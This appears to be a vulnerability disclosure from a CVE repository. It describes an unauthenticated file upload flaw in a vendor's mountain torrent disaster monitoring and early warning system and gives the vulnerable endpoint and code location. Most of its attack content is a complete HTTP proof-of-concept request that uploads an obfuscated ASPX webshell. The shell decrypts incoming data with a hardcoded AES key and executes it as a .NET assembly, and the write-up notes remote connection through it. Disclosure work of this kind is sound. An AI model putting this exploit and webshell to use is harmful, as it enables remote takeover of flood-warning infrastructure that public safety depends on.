Gen technology co., LTD. - four mountain torrent disaster prevention and control of monitoring and early warning system Duty - UploadFloodPlanFileUpdate module file upload loopholes

official website:https://www.istrong.cn/

Vulnerability location:/Duty/AjaxHandle/UploadFloodPlanFileUpdate.ashx

![WPS图片(1)](https://github.com/segonse/cve/assets/129601241/45813a6a-11d4-4745-9584-592dd1415c85)

/bin/Strongsoft.Web.dll

/ / Strongsoft.Web.Duty.AjaxHandle.UploadFloodPlanFileUpdate

Entry function:
![WPS图片(2)](https://github.com/segonse/cve/assets/129601241/2545a124-c281-4891-aeb3-2ec3172ec76f)

Enter the ArticleFileIpLoad function:
![WPS图片(3)](https://github.com/segonse/cve/assets/129601241/ff8fb885-a0c9-4095-b7f2-2a6bd8849ad8)

When incoming folder = / location/UploadFile/Docunment after upload/yyyyMMddHHmmssfff. Aspx.

POC
```
POST /Duty/AjaxHandle/UploadFloodPlanFileUpdate.ashx HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 1416
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB4tZ2o9YRDmhPXe7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryB4tZ2o9YRDmhPXe7
Content-Disposition: form-data; name="folder"

/UploadFile/
------WebKitFormBoundaryB4tZ2o9YRDmhPXe7
Content-Disposition: form-data; name="id"

1
------WebKitFormBoundaryB4tZ2o9YRDmhPXe7
Content-Disposition: form-data; name="isMain"

1
------WebKitFormBoundaryB4tZ2o9YRDmhPXe7
Content-Disposition: form-data; name="Filedata"; filename="api.aspx"
Content-Type: application/xml

<%@ Page Language="C#" %>
<%@Import Namespace="System.Reflection"%>
<%@Import Namespace="System.IO"%>
<%@Import Namespace="System.Security.Cryptography"%>
<%
    try {
        string key = "900bc885d7553375";
        byte[] k = Encoding.Default.GetBytes(key);
        Session.Add("sky", key);
        StreamReader sr = new StreamReader(Request.InputStream);
        string line = sr.ReadLine();
        if (!string.IsNullOrEmpty(line))
        {

            byte[] c = Convert.FromBase64String(line);
            Assembly assembly = typeof(Environment).Assembly;
            RijndaelManaged rm =(RijndaelManaged) assembly.CreateInstance("System.Secur"+"ity.Crypto"+"graphy.Rijnda"+"elManaged");
            byte[] data=rm.CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length);
            Assembly.Load(data).CreateInstance("U").Equals(this.Context);
            sr.Close();
        }
    }
    catch{ }

%>
------WebKitFormBoundaryB4tZ2o9YRDmhPXe7--
```
**Direct unauthorized upload of aspx Trojans**
![WPS图片(4)](https://github.com/segonse/cve/assets/129601241/1925c3c4-bfa4-4eb2-96e5-2780d6020401)
**Connect remotely via webshell**
![WPS图片(5)](https://github.com/segonse/cve/assets/129601241/3155d29f-63b6-440c-82e9-a37ab71e9300)
